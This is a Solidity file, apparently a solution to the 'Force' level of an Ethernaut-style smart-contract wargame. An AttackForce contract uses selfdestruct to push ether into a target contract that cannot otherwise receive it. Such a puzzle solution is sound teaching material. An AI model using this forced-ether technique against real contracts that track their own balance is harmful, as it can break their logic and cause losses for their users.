// SPDX-License-Identifier: MIT
pragma solidity ^0.4.18;

contract Force {
    /*
                   MEOW ?
         /\_/\   /
    ____/ o o \
  /~____  =ø= /
 (______)__m_m)
*/
}

contract AttackForce {
    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }

    constructor() public {}

    function attack(address _address) public payable {
        selfdestruct(_address);
    }
}
